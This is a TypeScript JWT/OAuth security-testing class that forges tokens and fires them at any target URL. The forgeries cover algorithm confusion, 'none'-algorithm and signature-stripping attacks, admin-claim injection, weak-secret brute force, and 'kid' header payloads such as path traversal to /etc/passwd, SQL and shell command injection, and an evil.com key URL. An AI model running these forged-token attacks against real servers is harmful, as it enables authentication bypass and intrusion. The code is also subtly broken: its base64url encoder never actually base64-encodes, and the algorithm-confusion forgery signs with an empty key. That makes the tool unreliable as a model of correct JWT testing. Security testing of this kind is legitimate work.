import { createHmac, createSign, randomBytes } from "crypto";

export interface JwtTestResult {
  testName: string;
  description: string;
  vulnerability: string;
  passed: boolean;
  severity: "critical" | "high" | "medium" | "low" | "info";
  details: string;
  manipulatedToken?: string;
  originalToken?: string;
  serverResponse?: {
    accepted: boolean;
    statusCode?: number;
    body?: string;
  };
  mitreAttackId?: string;
  recommendation?: string;
}

export interface JwtAnalysis {
  header: any;
  payload: any;
  signature: string;
  algorithm: string;
  expiresAt?: Date;
  issuedAt?: Date;
  issuer?: string;
  audience?: string | string[];
  subject?: string;
  customClaims: Record<string, any>;
}

export interface OAuthTokenTestConfig {
  targetUrl: string;
  token: string;
  headers?: Record<string, string>;
  testTypes?: OAuthTestType[];
  timeoutMs?: number;
}

export type OAuthTestType = 
  | "algorithm_confusion"
  | "signature_stripping"
  | "none_algorithm"
  | "key_confusion"
  | "token_expiration"
  | "claim_manipulation"
  | "weak_secret"
  | "kid_injection";

class OAuthTokenTester {
  async analyzeToken(token: string): Promise<JwtAnalysis> {
    const parts = token.split(".");
    if (parts.length !== 3) {
      throw new Error("Invalid JWT format: expected 3 parts");
    }

    const header = JSON.parse(this.base64UrlDecode(parts[0]));
    const payload = JSON.parse(this.base64UrlDecode(parts[1]));
    const signature = parts[2];

    const standardClaims = ["iss", "sub", "aud", "exp", "nbf", "iat", "jti"];
    const customClaims: Record<string, any> = {};
    
    for (const [key, value] of Object.entries(payload)) {
      if (!standardClaims.includes(key)) {
        customClaims[key] = value;
      }
    }

    return {
      header,
      payload,
      signature,
      algorithm: header.alg || "unknown",
      expiresAt: payload.exp ? new Date(payload.exp * 1000) : undefined,
      issuedAt: payload.iat ? new Date(payload.iat * 1000) : undefined,
      issuer: payload.iss,
      audience: payload.aud,
      subject: payload.sub,
      customClaims,
    };
  }

  async runAllTests(config: OAuthTokenTestConfig): Promise<JwtTestResult[]> {
    const results: JwtTestResult[] = [];
    const testTypes = config.testTypes || [
      "algorithm_confusion",
      "signature_stripping",
      "none_algorithm",
      "claim_manipulation",
      "weak_secret",
      "kid_injection",
    ];

    for (const testType of testTypes) {
      const testResult = await this.runTest(testType, config);
      results.push(...testResult);
    }

    return results;
  }

  private async runTest(testType: OAuthTestType, config: OAuthTokenTestConfig): Promise<JwtTestResult[]> {
    switch (testType) {
      case "algorithm_confusion":
        return this.testAlgorithmConfusion(config);
      case "signature_stripping":
        return this.testSignatureStripping(config);
      case "none_algorithm":
        return this.testNoneAlgorithm(config);
      case "claim_manipulation":
        return this.testClaimManipulation(config);
      case "weak_secret":
        return this.testWeakSecrets(config);
      case "kid_injection":
        return this.testKidInjection(config);
      default:
        return [];
    }
  }

  private async testAlgorithmConfusion(config: OAuthTokenTestConfig): Promise<JwtTestResult[]> {
    const results: JwtTestResult[] = [];

    try {
      const analysis = await this.analyzeToken(config.token);
      
      if (analysis.algorithm.startsWith("RS") || analysis.algorithm.startsWith("ES")) {
        const rsToHsToken = this.createTokenWithAlgorithm(
          analysis.payload,
          "HS256",
          analysis.header
        );

        const response = await this.testToken(config.targetUrl, rsToHsToken, config);

        results.push({
          testName: "RS256 to HS256 Algorithm Confusion",
          description: "Tests if the server accepts a token signed with HS256 when expecting RS256",
          vulnerability: "CVE-2016-5431 - JWT Algorithm Confusion",
          passed: !response.accepted,
          severity: "critical",
          details: response.accepted 
            ? "Server accepted HS256 token when expecting RS256 - vulnerable to algorithm confusion attack"
            : "Server correctly rejected algorithm-confused token",
          manipulatedToken: rsToHsToken,
          originalToken: config.token,
          serverResponse: response,
          mitreAttackId: "T1550.001",
          recommendation: "Explicitly validate the algorithm in JWT verification and reject unexpected algorithms",
        });
      }

      const esTests = ["ES256", "ES384", "ES512"];
      for (const targetAlg of esTests) {
        if (analysis.algorithm !== targetAlg) {
          const manipulatedToken = this.createTokenWithAlgorithm(
            analysis.payload,
            targetAlg,
            analysis.header
          );

          const response = await this.testToken(config.targetUrl, manipulatedToken, config);

          if (response.accepted) {
            results.push({
              testName: `Algorithm Switch to ${targetAlg}`,
              description: `Tests if server accepts token with changed algorithm to ${targetAlg}`,
              vulnerability: "Algorithm Confusion",
              passed: false,
              severity: "high",
              details: `Server accepted token with switched algorithm from ${analysis.algorithm} to ${targetAlg}`,
              manipulatedToken,
              originalToken: config.token,
              serverResponse: response,
              mitreAttackId: "T1550.001",
              recommendation: "Validate algorithm matches expected value before verification",
            });
          }
        }
      }
    } catch (error: any) {
      results.push({
        testName: "Algorithm Confusion Test",
        description: "Could not complete algorithm confusion testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testSignatureStripping(config: OAuthTokenTestConfig): Promise<JwtTestResult[]> {
    const results: JwtTestResult[] = [];

    try {
      const parts = config.token.split(".");
      
      const emptySignature = `${parts[0]}.${parts[1]}.`;
      const emptyResponse = await this.testToken(config.targetUrl, emptySignature, config);

      results.push({
        testName: "Empty Signature Attack",
        description: "Tests if the server accepts a JWT with an empty signature",
        vulnerability: "Signature Validation Bypass",
        passed: !emptyResponse.accepted,
        severity: "critical",
        details: emptyResponse.accepted
          ? "Server accepted JWT with empty signature - signature validation is missing or broken"
          : "Server correctly rejected token with empty signature",
        manipulatedToken: emptySignature,
        originalToken: config.token,
        serverResponse: emptyResponse,
        mitreAttackId: "T1550.001",
        recommendation: "Always validate JWT signatures and reject tokens with empty or invalid signatures",
      });

      const randomSignature = `${parts[0]}.${parts[1]}.${this.base64UrlEncode(randomBytes(32).toString("base64"))}`;
      const randomResponse = await this.testToken(config.targetUrl, randomSignature, config);

      results.push({
        testName: "Random Signature Attack",
        description: "Tests if the server accepts a JWT with a random signature",
        vulnerability: "Signature Validation Bypass",
        passed: !randomResponse.accepted,
        severity: "critical",
        details: randomResponse.accepted
          ? "Server accepted JWT with random signature - signature validation is broken"
          : "Server correctly rejected token with invalid signature",
        manipulatedToken: randomSignature,
        originalToken: config.token,
        serverResponse: randomResponse,
        mitreAttackId: "T1550.001",
        recommendation: "Implement proper cryptographic signature verification",
      });
    } catch (error: any) {
      results.push({
        testName: "Signature Stripping Test",
        description: "Could not complete signature stripping testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testNoneAlgorithm(config: OAuthTokenTestConfig): Promise<JwtTestResult[]> {
    const results: JwtTestResult[] = [];

    const noneVariants = ["none", "None", "NONE", "nOnE"];

    for (const noneAlg of noneVariants) {
      try {
        const analysis = await this.analyzeToken(config.token);
        const newHeader = { ...analysis.header, alg: noneAlg };
        
        const headerB64 = this.base64UrlEncode(JSON.stringify(newHeader));
        const payloadB64 = config.token.split(".")[1];
        const noneToken = `${headerB64}.${payloadB64}.`;

        const response = await this.testToken(config.targetUrl, noneToken, config);

        if (response.accepted) {
          results.push({
            testName: `None Algorithm Attack (${noneAlg})`,
            description: `Tests if server accepts JWT with alg="${noneAlg}" and no signature`,
            vulnerability: "CVE-2015-9235 - JWT 'none' Algorithm Vulnerability",
            passed: false,
            severity: "critical",
            details: `Server accepted token with algorithm "${noneAlg}" - completely bypasses authentication`,
            manipulatedToken: noneToken,
            originalToken: config.token,
            serverResponse: response,
            mitreAttackId: "T1550.001",
            recommendation: "Explicitly reject 'none' algorithm and its variants in JWT verification",
          });
        }
      } catch (error: any) {
        continue;
      }
    }

    if (results.length === 0) {
      results.push({
        testName: "None Algorithm Attack",
        description: "Tested all 'none' algorithm variants",
        vulnerability: "CVE-2015-9235",
        passed: true,
        severity: "info",
        details: "Server correctly rejected all 'none' algorithm variants",
      });
    }

    return results;
  }

  private async testClaimManipulation(config: OAuthTokenTestConfig): Promise<JwtTestResult[]> {
    const results: JwtTestResult[] = [];

    try {
      const analysis = await this.analyzeToken(config.token);

      const claimTests = [
        {
          name: "Admin Role Injection",
          claim: "role",
          values: ["admin", "administrator", "superuser", "root"],
        },
        {
          name: "Admin Flag Injection", 
          claim: "admin",
          values: [true, 1, "true"],
        },
        {
          name: "User ID Manipulation",
          claim: "sub",
          values: ["1", "0", "admin", "administrator"],
        },
        {
          name: "Issuer Manipulation",
          claim: "iss",
          values: ["https://evil.com", "https://attacker.com/auth"],
        },
        {
          name: "Audience Manipulation",
          claim: "aud",
          values: ["*", "all", "admin-api"],
        },
      ];

      for (const test of claimTests) {
        for (const value of test.values) {
          const manipulatedPayload = { ...analysis.payload, [test.claim]: value };
          
          const headerB64 = config.token.split(".")[0];
          const payloadB64 = this.base64UrlEncode(JSON.stringify(manipulatedPayload));
          const signatureB64 = config.token.split(".")[2];
          const manipulatedToken = `${headerB64}.${payloadB64}.${signatureB64}`;

          const response = await this.testToken(config.targetUrl, manipulatedToken, config);

          if (response.accepted) {
            results.push({
              testName: test.name,
              description: `Tests if server accepts token with manipulated ${test.claim} claim`,
              vulnerability: "JWT Claim Manipulation",
              passed: false,
              severity: test.claim === "sub" || test.claim === "role" || test.claim === "admin" ? "critical" : "high",
              details: `Server accepted token with ${test.claim}=${JSON.stringify(value)} - signature validation may be insufficient`,
              manipulatedToken,
              originalToken: config.token,
              serverResponse: response,
              mitreAttackId: "T1550.001",
              recommendation: "Ensure signature validation occurs before claim processing",
            });
            break;
          }
        }
      }

      if (analysis.payload.exp) {
        const futurePayload = { 
          ...analysis.payload, 
          exp: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60)
        };
        
        const headerB64 = config.token.split(".")[0];
        const payloadB64 = this.base64UrlEncode(JSON.stringify(futurePayload));
        const signatureB64 = config.token.split(".")[2];
        const futureToken = `${headerB64}.${payloadB64}.${signatureB64}`;

        const response = await this.testToken(config.targetUrl, futureToken, config);

        if (response.accepted) {
          results.push({
            testName: "Expiration Extension Attack",
            description: "Tests if server accepts token with extended expiration",
            vulnerability: "Token Expiration Bypass",
            passed: false,
            severity: "high",
            details: "Server accepted token with extended expiration - signature validation may be missing",
            manipulatedToken: futureToken,
            originalToken: config.token,
            serverResponse: response,
            mitreAttackId: "T1550.001",
            recommendation: "Validate signatures before processing expiration claims",
          });
        }
      }
    } catch (error: any) {
      results.push({
        testName: "Claim Manipulation Test",
        description: "Could not complete claim manipulation testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testWeakSecrets(config: OAuthTokenTestConfig): Promise<JwtTestResult[]> {
    const results: JwtTestResult[] = [];

    const commonSecrets = [
      "secret",
      "password",
      "123456",
      "jwt_secret",
      "jwt-secret",
      "supersecret",
      "changeme",
      "admin",
      "default",
      "test",
      "development",
      "your-256-bit-secret",
      "your-secret-key",
      "my-secret-key",
      "auth_secret",
      "token_secret",
      "SECRET_KEY",
      "private-key",
      "shhhhhhared-secret",
    ];

    try {
      const analysis = await this.analyzeToken(config.token);

      if (!analysis.algorithm.startsWith("HS")) {
        results.push({
          testName: "Weak Secret Detection",
          description: "Token uses asymmetric algorithm - weak secret test not applicable",
          vulnerability: "N/A",
          passed: true,
          severity: "info",
          details: `Token uses ${analysis.algorithm} which is an asymmetric algorithm`,
        });
        return results;
      }

      const parts = config.token.split(".");
      const originalData = `${parts[0]}.${parts[1]}`;
      const originalSignature = parts[2];

      for (const secret of commonSecrets) {
        const expectedSignature = this.signHS256(originalData, secret);
        
        if (expectedSignature === originalSignature) {
          results.push({
            testName: "Weak Secret Detection",
            description: "Tests if JWT is signed with a common/weak secret",
            vulnerability: "Weak Cryptographic Key",
            passed: false,
            severity: "critical",
            details: `Token is signed with weak secret: "${secret}"`,
            originalToken: config.token,
            mitreAttackId: "T1552.004",
            recommendation: "Use a strong, random secret of at least 256 bits for HMAC signing",
          });
          return results;
        }
      }

      results.push({
        testName: "Weak Secret Detection",
        description: "Tested common secrets against token signature",
        vulnerability: "Weak Cryptographic Key",
        passed: true,
        severity: "info",
        details: "Token is not signed with any of the tested common secrets",
      });
    } catch (error: any) {
      results.push({
        testName: "Weak Secret Detection",
        description: "Could not complete weak secret testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testKidInjection(config: OAuthTokenTestConfig): Promise<JwtTestResult[]> {
    const results: JwtTestResult[] = [];

    try {
      const analysis = await this.analyzeToken(config.token);

      const kidPayloads = [
        { kid: "../../../../../../etc/passwd", type: "path_traversal" },
        { kid: "/dev/null", type: "null_file" },
        { kid: "key' OR '1'='1", type: "sql_injection" },
        { kid: "key\"; ls -la; echo \"", type: "command_injection" },
        { kid: "|cat /etc/passwd", type: "pipe_injection" },
        { kid: "https://evil.com/key.pem", type: "url_injection" },
      ];

      for (const payload of kidPayloads) {
        const newHeader = { ...analysis.header, kid: payload.kid };
        const headerB64 = this.base64UrlEncode(JSON.stringify(newHeader));
        const payloadB64 = config.token.split(".")[1];
        const manipulatedToken = `${headerB64}.${payloadB64}.`;

        const response = await this.testToken(config.targetUrl, manipulatedToken, config);

        if (response.accepted || (response.body && response.body.includes("error"))) {
          const serverError = response.body?.toLowerCase().includes("error") || 
                             response.body?.toLowerCase().includes("exception") ||
                             response.statusCode === 500;

          if (serverError) {
            results.push({
              testName: `KID ${payload.type.replace(/_/g, " ")} Attack`,
              description: `Tests for ${payload.type} vulnerability in 'kid' header`,
              vulnerability: `JWT KID ${payload.type}`,
              passed: false,
              severity: payload.type === "sql_injection" || payload.type === "command_injection" ? "critical" : "high",
              details: `Server shows error response to KID injection - may be vulnerable to ${payload.type}`,
              manipulatedToken,
              originalToken: config.token,
              serverResponse: response,
              mitreAttackId: payload.type === "sql_injection" ? "T1190" : "T1059",
              recommendation: "Sanitize and validate 'kid' header value, use allowlist of valid key IDs",
            });
          }
        }
      }

      if (results.filter(r => !r.passed).length === 0) {
        results.push({
          testName: "KID Injection Tests",
          description: "Tested various KID injection payloads",
          vulnerability: "KID Header Injection",
          passed: true,
          severity: "info",
          details: "No KID injection vulnerabilities detected",
        });
      }
    } catch (error: any) {
      results.push({
        testName: "KID Injection Test",
        description: "Could not complete KID injection testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testToken(
    targetUrl: string,
    token: string,
    config: OAuthTokenTestConfig
  ): Promise<{ accepted: boolean; statusCode?: number; body?: string }> {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), config.timeoutMs || 10000);

      const response = await fetch(targetUrl, {
        method: "GET",
        headers: {
          "Authorization": `Bearer ${token}`,
          ...config.headers,
        },
        signal: controller.signal,
      });

      clearTimeout(timeoutId);

      const body = await response.text();
      const accepted = response.status >= 200 && response.status < 400;

      return { accepted, statusCode: response.status, body: body.slice(0, 1000) };
    } catch (error: any) {
      return { accepted: false, body: `Error: ${error.message}` };
    }
  }

  private createTokenWithAlgorithm(payload: any, algorithm: string, originalHeader: any): string {
    const newHeader = { ...originalHeader, alg: algorithm };
    const headerB64 = this.base64UrlEncode(JSON.stringify(newHeader));
    const payloadB64 = this.base64UrlEncode(JSON.stringify(payload));
    
    const signature = this.signHS256(`${headerB64}.${payloadB64}`, "");
    
    return `${headerB64}.${payloadB64}.${signature}`;
  }

  private signHS256(data: string, secret: string): string {
    const hmac = createHmac("sha256", secret);
    hmac.update(data);
    return this.base64UrlEncode(hmac.digest("base64"));
  }

  private base64UrlEncode(str: string): string {
    return str
      .replace(/\+/g, "-")
      .replace(/\//g, "_")
      .replace(/=/g, "");
  }

  private base64UrlDecode(str: string): string {
    let base64 = str.replace(/-/g, "+").replace(/_/g, "/");
    while (base64.length % 4) {
      base64 += "=";
    }
    return Buffer.from(base64, "base64").toString("utf-8");
  }

  generateReport(results: JwtTestResult[]): string {
    const lines: string[] = [
      "# OAuth/JWT Security Test Report",
      "",
      `**Generated:** ${new Date().toISOString()}`,
      "",
      "## Summary",
      "",
      `| Metric | Value |`,
      `|--------|-------|`,
      `| Total Tests | ${results.length} |`,
      `| Passed | ${results.filter(r => r.passed).length} |`,
      `| Failed | ${results.filter(r => !r.passed).length} |`,
      `| Critical Issues | ${results.filter(r => !r.passed && r.severity === "critical").length} |`,
      `| High Issues | ${results.filter(r => !r.passed && r.severity === "high").length} |`,
      "",
    ];

    const criticals = results.filter(r => !r.passed && r.severity === "critical");
    if (criticals.length > 0) {
      lines.push("## Critical Vulnerabilities", "");
      for (const finding of criticals) {
        lines.push(`### ${finding.testName}`);
        lines.push(`- **Vulnerability:** ${finding.vulnerability}`);
        lines.push(`- **MITRE ATT&CK:** ${finding.mitreAttackId || "N/A"}`);
        lines.push(`- **Details:** ${finding.details}`);
        lines.push(`- **Recommendation:** ${finding.recommendation || "N/A"}`);
        lines.push("");
      }
    }

    const highs = results.filter(r => !r.passed && r.severity === "high");
    if (highs.length > 0) {
      lines.push("## High Severity Issues", "");
      for (const finding of highs) {
        lines.push(`### ${finding.testName}`);
        lines.push(`- **Vulnerability:** ${finding.vulnerability}`);
        lines.push(`- **Details:** ${finding.details}`);
        lines.push(`- **Recommendation:** ${finding.recommendation || "N/A"}`);
        lines.push("");
      }
    }

    lines.push("## All Test Results", "");
    lines.push("| Test | Status | Severity | Details |");
    lines.push("|------|--------|----------|---------|");
    for (const result of results) {
      const status = result.passed ? "PASS" : "FAIL";
      lines.push(`| ${result.testName} | ${status} | ${result.severity} | ${result.details.slice(0, 50)}... |`);
    }

    return lines.join("\n");
  }
}

export const oauthTokenTester = new OAuthTokenTester();
